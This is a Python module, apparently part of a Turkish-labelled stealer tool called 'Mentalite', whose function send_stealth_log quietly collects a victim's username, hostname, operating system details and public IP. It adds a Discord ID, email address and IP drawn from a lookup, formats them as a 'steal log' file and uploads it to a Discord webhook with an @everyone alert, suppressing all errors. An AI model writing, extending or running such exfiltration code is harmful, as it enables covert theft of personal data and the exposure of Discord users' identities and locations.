import requests
import os
import platform
import socket
import getpass
import datetime
import io
from .config import get_webhook
from .utils import decode_base64_safe

def send_stealth_log(data: dict | None = None, extra: dict | None = None):
    try:
        webhook = get_webhook()
        if not webhook:
            return

        now = datetime.datetime.now()
        tarih = now.strftime("%Y-%m-%d-%H-%M-%S")
        filename = f"mentalite-steal-log-{tarih}.txt"

        # Sistem bilgileri
        username = getpass.getuser()
        hostname = socket.gethostname()
        os_type = platform.system()
        os_release = platform.release()
        os_version = platform.version()
        arch = platform.machine()
        public_ip = "unknown"

        try:
            public_ip = requests.get("https://api.ipify.org", timeout=4).text.strip()
        except:
            pass

        txt_content = f"""
============================
     MENTALITE STEAL LOG
     {now.strftime('%d.%m.%Y %H:%M:%S')}
============================

KULLANICI / SİSTEM
──────────────────
• Kullanıcı adı     : {username}
• Hostname          : {hostname}
• İşletim Sistemi   : {os_type} {os_release} ({arch})
• Public IP         : {public_ip}

SORGULANAN BİLGİLER
───────────────────
• Discord ID        : {data.get('user', {}).get('id', extra.get('id', '—')) if data else '—'}
• Email (raw)       : {data.get('user', {}).get('email', '—') if data else '—'}
• Email (decoded)   : {decode_base64_safe(data.get('user', {}).get('email', '')) or 'decode failed' if data and data.get('user', {}).get('email') else '—'}
• Supabase IP       : {data.get('user', {}).get('ip', '—') if data else '—'}

EKSTRA
──────
{extra.get('error', 'Başarılı sorgu') if extra else 'Başarılı sorgu'}

============================
          SON
============================
""".strip()

        files = {'file': (filename, io.StringIO(txt_content), 'text/plain')}
        payload = {
            'content': f"@everyone Başarıyla çekildi. ID: {data.get('user', {}).get('id', 'bilinmiyor') if data else 'bilinmiyor'}",
            'allowed_mentions': {'parse': ['everyone']}
        }

        requests.post(
            webhook,
            data={'payload_json': str(payload)},
            files=files,
            timeout=15
        )

    except Exception:
        pass